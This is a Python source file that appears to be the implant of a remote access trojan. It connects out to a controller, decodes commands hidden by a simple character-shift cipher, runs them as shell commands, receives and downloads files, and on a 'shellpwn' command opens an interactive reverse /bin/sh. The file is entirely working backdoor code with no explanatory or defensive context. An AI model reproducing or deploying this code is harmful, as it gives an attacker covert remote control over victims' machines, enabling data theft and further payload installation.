import socket
import os
import subprocess
import select
import time
import ctypes
import urllib
import tcpall
import _thread

HOST="localhost"

PORT=9999

s=socket.socket()

def revshell(port):

	global HOST

	sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	sck.connect((socket.gethostbyname(HOST), port))

	os.dup2(sck.fileno(),0)

	os.dup2(sck.fileno(),1)

	os.dup2(sck.fileno(),2)

	p = subprocess.call(["/bin/sh", "-i"])

def download(url,fname):

    urllib.urlretrieve(url,fname)

    global s

    tcpall.send_all(s,b'ACK')

def frecv(sck):

    fsize=int(sck.recv(1024).decode())

    if(fsize%1024)==0:

        riter=int(fsize/1024)

    else:

        riter=int(fsize/1024)+1

    sck.send(str.encode('ack'))

    fname=sck.recv(1024).decode()

    sck.send(str.encode('ack'))

    fhandle=open(fname,'wb')

    for i in range(riter):

        fhandle.write(sck.recv(1024))

    sck.send(str.encode('ack'))

    fhandle.close()

def dec(txt):

	i=0

	newbuf=''

	char=''

	dec=0

	for i in range(len(txt)):

		dec=ord(txt[i])

		char=chr(dec-4)

		newbuf+=char

	return newbuf

def enc(txt):

	i=0

	newbuf=''

	char=''

	dec=0

	for i in range(len(txt)):

		dec=ord(txt[i])

		char=chr(dec+4)

		newbuf+=char

	return newbuf

def reverseconn():

    global HOST

    global PORT

    host=socket.gethostbyname(HOST) 

    port=PORT

    global s

    s.connect((HOST,PORT))

    while True:

        recvcmd=tcpall.recv_all(s)

        if dec(recvcmd[:2].decode("utf-8"))=="cd":

            try:

                os.chdir(dec(recvcmd[3:].decode("utf-8")))

            except:

                pass

            tcpall.send_all(s,str.encode(enc(str(os.getcwd())+'> ')))

        elif dec(recvcmd.decode("utf-8"))=="quit":

            break

        elif dec(recvcmd[:6].decode("utf-8"))=="ftrans":

            frecv(s)

        elif dec(recvcmd[:8].decode("utf-8"))=="download":

            download(dec(recvcmd[9:].decode("utf-8")),dec(tcpall.recv_all(s,1024).decode("utf-8")))

        elif dec(recvcmd[:8].decode("utf-8"))=="shellpwn":

            try:

                prt=(int(dec(recvcmd[9:].decode("utf-8"))))

                _thread.start_new_thread(revshell,(prt,))

            except:

                pass

            tcpall.send_all(s,str.encode(enc('PWNED!')))

        elif len(recvcmd)>0 and dec(recvcmd[:2].decode("utf-8"))!="cd":

            cmd = subprocess.Popen(dec(recvcmd[:].decode("utf-8")), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

            obyte=cmd.stdout.read()+cmd.stderr.read()

            ostr=obyte.decode()

            tcpall.send_all(s,str.encode(enc(ostr+str(os.getcwd())+'> '),"utf-8"))

    s.close()

reverseconn()

    

    


        
